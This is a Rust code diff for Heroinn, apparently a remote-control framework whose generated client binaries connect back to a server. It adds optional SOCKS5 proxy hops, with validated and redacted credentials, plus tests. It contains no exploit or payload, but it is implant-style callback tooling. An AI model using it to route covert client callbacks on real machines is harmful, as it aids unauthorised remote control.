@@ -5,6 +5,7 @@
 //! TCP/WebSocket/UDP transports built on top of them. Every byte layout here is
 //! load-bearing for interoperability, so protocol changes must stay additive.
 
+use std::fmt;
 use std::io::{BufWriter, Cursor, Read, Write};
 use std::net::{IpAddr, Ipv6Addr};
 
@@ -33,6 +34,9 @@ pub const CONNECTION_INFO_DATA_LEN: usize = 1024;
 
 /// Serialized size of a [`SlaveDNA`]: flag, big-endian length and payload.
 pub const SLAVE_DNA_LEN: usize = 16 + CONNECTION_INFO_DATA_LEN;
+
+/// Maximum byte length of one SOCKS5 RFC 1929 credential field.
+pub const SOCKS5_AUTH_FIELD_MAX_BYTES: usize = u8::MAX as usize;
 
 /// Connection stamp embedded into every generated `heroinn_client` binary.
 ///
@@ -112,17 +116,184 @@ impl SlaveDNA {
     }
 }
 
+/// Optional SOCKS5 username/password authentication embedded in a generated client.
+#[derive(Serialize, Deserialize, Clone, PartialEq, Eq)]
+pub struct Socks5Auth {
+    pub username: String,
+    pub password: String,
+}
+
+impl fmt::Debug for Socks5Auth {
+    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
+        formatter.write_str("Socks5Auth(<redacted>)")
+    }
+}
+
+impl Socks5Auth {
+    pub fn new(username: &str, password: &str) -> Result<Self> {
+        let auth = Self {
+            username: username.to_string(),
+            password: password.to_string(),
+        };
+        auth.validate()?;
+        Ok(auth)
+    }
+
+    fn validate(&self) -> Result<()> {
+        validate_socks5_auth_field("username", &self.username)?;
+        validate_socks5_auth_field("password", &self.password)
+    }
+}
+
+/// A SOCKS5 hop that a generated client dials before reaching Heroinn.
+#[derive(Serialize, Deserialize, Clone, PartialEq, Eq)]
+pub struct Socks5ProxyConfig {
+    pub host: String,
+    pub port: u16,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub auth: Option<Socks5Auth>,
+}
+
+impl fmt::Debug for Socks5ProxyConfig {
+    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
+        formatter
+            .debug_struct("Socks5ProxyConfig")
+            .field("host", &self.host)
+            .field("port", &self.port)
+            .field("auth", &self.auth.as_ref().map(|_| "<redacted>"))
+            .finish()
+    }
+}
+
+impl Socks5ProxyConfig {
+    pub fn new(host: &str, port: u16) -> Result<Self> {
+        let config = Self {
+            host: normalize_socks5_proxy_host(host)?,
+            port,
+            auth: None,
+        };
+        config.validate()?;
+        Ok(config)
+    }
+
+    pub fn with_auth(host: &str, port: u16, username: &str, password: &str) -> Result<Self> {
+        let config = Self {
+            host: normalize_socks5_proxy_host(host)?,
+            port,
+            auth: Some(Socks5Auth::new(username, password)?),
+        };
+        config.validate()?;
+        Ok(config)
+    }
+
+    pub fn validate(&self) -> Result<()> {
+        if self.host.trim().is_empty() {
+            return Err(Error::Other("SOCKS5 proxy host is required".to_string()));
+        }
+        if self.host != normalize_socks5_proxy_host(&self.host)? {
+            return Err(Error::Other(
+                "SOCKS5 proxy host must be a domain, IPv4 address, or bracketed IPv6 address"
+                    .to_string(),
+            ));
+        }
+        if self.port == 0 {
+            return Err(Error::Other(
+                "SOCKS5 proxy port must be between 1 and 65535".to_string(),
+            ));
+        }
+        if let Some(auth) = &self.auth {
+            auth.validate()?;
+        }
+        Ok(())
+    }
+
+    /// Credential-free `host:port` representation.
+    pub fn authority(&self) -> String {
+        if self.host.parse::<Ipv6Addr>().is_ok() {
+            format!("[{}]:{}", self.host, self.port)
+        } else {
+            format!("{}:{}", self.host, self.port)
+        }
+    }
+}
+
+fn normalize_socks5_proxy_host(host: &str) -> Result<String> {
+    let host = host.trim();
+    if host.is_empty() {
+        return Err(Error::Other("SOCKS5 proxy host is required".to_string()));
+    }
+    if host
+        .chars()
+        .any(|character| character.is_control() || character.is_whitespace())
+    {
+        return Err(Error::Other(
+            "SOCKS5 proxy host contains invalid whitespace or control characters".to_string(),
+        ));
+    }
+
+    let normalized = normalize_host(host)
+        .map_err(|_| Error::Other("SOCKS5 proxy host is invalid".to_string()))?;
+    Ok(normalized
+        .strip_prefix('[')
+        .and_then(|value| value.strip_suffix(']'))
+        .unwrap_or(&normalized)
+        .to_string())
+}
+
+fn validate_socks5_auth_field(name: &'static str, value: &str) -> Result<()> {
+    let bytes = value.as_bytes();
+    if bytes.is_empty() || bytes.len() > SOCKS5_AUTH_FIELD_MAX_BYTES {
+        return Err(Error::Other(format!(
+            "SOCKS5 {name} must be between 1 and {SOCKS5_AUTH_FIELD_MAX_BYTES} UTF-8 bytes"
+        )));
+    }
+    if bytes
+        .iter()
+        .any(|byte| matches!(byte, b'\0' | b'\r' | b'\n'))
+    {
+        return Err(Error::Other(format!(
+            "SOCKS5 {name} must not contain NUL, CR, or LF"
+        )));
+    }
+    Ok(())
+}
+
 /// Location and label a generated client should connect back to.
-#[derive(Serialize, Deserialize, Debug, Clone, PartialEq, Eq)]
+#[derive(Serialize, Deserialize, Clone, PartialEq, Eq)]
 pub struct ConnectionInfo {
     pub protocol: u8,
     pub address: String,
     pub remark: String,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub socks5_proxy: Option<Socks5ProxyConfig>,
+}
+
+impl fmt::Debug for ConnectionInfo {
+    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
+        formatter
+            .debug_struct("ConnectionInfo")
+            .field("protocol", &self.protocol)
+            .field("address", &self.address)
+            .field("remark", &self.remark)
+            .field("socks5_proxy", &self.socks5_proxy)
+            .finish()
+    }
 }
 
 impl ConnectionInfo {
     /// Validate and build the connection information shown in the generator.
     pub fn new(protocol: HeroinnProtocol, host: &str, port: &str, remark: &str) -> Result<Self> {
+        Self::new_with_socks5(protocol, host, port, remark, None)
+    }
+
+    /// Validate and build connection information with an optional specified SOCKS5 hop.
+    pub fn new_with_socks5(
+        protocol: HeroinnProtocol,
+        host: &str,
+        port: &str,
+        remark: &str,
+        socks5_proxy: Option<Socks5ProxyConfig>,
+    ) -> Result<Self> {
         let host = host.trim();
         if host.is_empty() {
             return Err(Error::Other("address is required".to_string()));
@@ -140,7 +311,9 @@ impl ConnectionInfo {
             protocol: protocol.to_u8(),
             address: format!("{}:{}", normalize_host(host)?, port),
             remark: remark.trim().to_string(),
+            socks5_proxy,
         };
+        info.validate()?;
 
         let payload_len = info.serialize()?.len();
         if payload_len > CONNECTION_INFO_DATA_LEN {
@@ -151,11 +324,31 @@ impl ConnectionInfo {
     }
 
     pub fn parse(data: &[u8]) -> Result<Self> {
-        Ok(serde_json::from_slice(data)?)
+        let info: Self = serde_json::from_slice(data)?;
+        info.validate()?;
+        Ok(info)
     }
 
     pub fn serialize(&self) -> Result<Vec<u8>> {
-        Ok(serde_json::to_vec(self)?)
+        self.validate()?;
+        let payload = serde_json::to_vec(self)?;
+        if payload.len() > CONNECTION_INFO_DATA_LEN {
+            return Err(Error::PacketTooLarge(payload.len()));
+        }
+        Ok(payload)
+    }
+
+    pub fn validate(&self) -> Result<()> {
+        if let Some(proxy) = &self.socks5_proxy {
+            let protocol = HeroinnProtocol::try_from(self.protocol)?;
+            if !matches!(protocol, HeroinnProtocol::TCP | HeroinnProtocol::HTTP) {
+                return Err(Error::Other(
+                    "SOCKS5 proxy is only supported for TCP and HTTP clients".to_string(),
+                ));
+            }
+            proxy.validate()?;
+        }
+        Ok(())
     }
 }
 
@@ -212,6 +405,7 @@ mod connection_info_tests {
                 protocol: 0,
                 address: "127.0.0.1:9001".to_string(),
                 remark: "debug".to_string(),
+                socks5_proxy: None,
             }
         );
 
@@ -260,6 +454,116 @@ mod connection_info_tests {
         let err =
             ConnectionInfo::new(HeroinnProtocol::TCP, "127.0.0.1", "9001", &remark).unwrap_err();
         assert!(matches!(err, Error::PacketTooLarge(_)));
+    }
+
+    #[test]
+    fn socks5_connection_info_round_trips_and_redacts_credentials() {
+        let proxy =
+            Socks5ProxyConfig::with_auth("[::1]", 1080, "proxy-user", "proxy-password").unwrap();
+        assert_eq!(proxy.authority(), "[::1]:1080");
+        assert_eq!(proxy.host, "::1");
+
+        let info = ConnectionInfo::new_with_socks5(
+            HeroinnProtocol::HTTP,
+            "server.example",
+            "443",
+            "production",
+            Some(proxy),
+        )
+        .unwrap();
+        let payload = info.serialize().unwrap();
+        assert_eq!(ConnectionInfo::parse(&payload).unwrap(), info);
+
+        let debug = format!("{info:?}");
+        assert!(debug.contains("Socks5ProxyConfig"));
+        assert!(!debug.contains("proxy-user"));
+        assert!(!debug.contains("proxy-password"));
+        assert!(!debug.contains("user:password"));
+    }
+
+    #[test]
+    fn old_connection_info_without_socks5_defaults_to_none() {
+        let info =
+            ConnectionInfo::parse(br#"{"protocol":0,"address":"127.0.0.1:9001","remark":"old"}"#)
+                .unwrap();
+        assert_eq!(info.socks5_proxy, None);
+
+        #[derive(Deserialize)]
+        struct LegacyConnectionInfo {
+            protocol: u8,
+            address: String,
+            remark: String,
+        }
+        let new = ConnectionInfo::new_with_socks5(
+            HeroinnProtocol::TCP,
+            "127.0.0.1",
+            "9001",
+            "new",
+            Some(Socks5ProxyConfig::new("proxy.example", 1080).unwrap()),
+        )
+        .unwrap();
+        let legacy: LegacyConnectionInfo =
+            serde_json::from_slice(&new.serialize().unwrap()).unwrap();
+        assert_eq!(legacy.protocol, 0);
+        assert_eq!(legacy.address, "127.0.0.1:9001");
+        assert_eq!(legacy.remark, "new");
+    }
+
+    #[test]
+    fn socks5_connection_info_rejects_unsafe_or_oversized_values() {
+        for (host, port, expected) in [
+            ("", 1080, "host is required"),
+            ("bad host", 1080, "invalid whitespace"),
+            ("proxy.example:1080", 1080, "host is invalid"),
+        ] {
+            let error = Socks5ProxyConfig::new(host, port).unwrap_err();
+            assert!(
+                error.to_string().contains(expected),
+                "{host}: {expected} / {error}"
+            );
+        }
+        assert!(Socks5ProxyConfig::new("proxy.example", 0).is_err());
+        for (username, password) in [
+            ("", "password"),
+            ("username", ""),
+            ("bad\nname", "password"),
+            ("username", "bad\0password"),
+        ] {
+            assert!(
+                Socks5ProxyConfig::with_auth("proxy.example", 1080, username, password).is_err(),
+                "{username:?}/{password:?} should be rejected"
+            );
+        }
+        assert!(
+            Socks5ProxyConfig::with_auth(
+                "proxy.example",
+                1080,
+                &"u".repeat(SOCKS5_AUTH_FIELD_MAX_BYTES + 1),
+                "password",
+            )
+            .is_err()
+        );
+
+        let udp = ConnectionInfo::new_with_socks5(
+            HeroinnProtocol::UDP,
+            "127.0.0.1",
+            "8000",
+            "",
+            Some(Socks5ProxyConfig::new("proxy.example", 1080).unwrap()),
+        );
+        assert!(udp.is_err());
+
+        let remark = "r".repeat(CONNECTION_INFO_DATA_LEN);
+        assert!(
+            ConnectionInfo::new_with_socks5(
+                HeroinnProtocol::TCP,
+                "server.example",
+                "9001",
+                &remark,
+                Some(Socks5ProxyConfig::new("proxy.example", 1080).unwrap()),
+            )
+            .is_err()
+        );
     }
 
     #[test]
